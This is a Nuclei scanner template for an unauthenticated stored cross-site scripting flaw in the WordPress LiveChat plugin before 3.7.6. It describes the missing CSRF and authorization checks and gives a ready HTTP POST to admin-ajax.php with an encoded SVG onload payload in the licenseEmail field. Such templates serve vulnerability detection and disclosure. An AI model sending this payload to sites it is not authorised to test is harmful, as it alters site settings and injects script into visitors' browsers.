# Nuclei Template: WordPress LiveChat < 3.7.6 - Unauthenticated Stored XSS
**Template ID:** wp-livechat-stored-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**Source:** Nuclei Template (`wp-livechat-stored-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress LiveChat plugin before < 3.7.6 lacked CSRF and authorization checks on the option update handler in the LiveChatAdmin constructor. The code ran on any POST to a wp-admin URL without Referer validation, nonce check, or capability verification. This allowed unauthenticated attackers to update plugin settings.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wp-live-chat-software-for-wordpress/readme.txt
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

licenseNumber=42&licenseEmail=%22%3E%3Csvg%2Fonload%3Dalert(document.domain)%3E
```

## References
- https://wpscan.com/plugin/wp-live-chat-software-for-wordpress/
- https://wordpress.org/plugins/wp-live-chat-software-for-wordpress
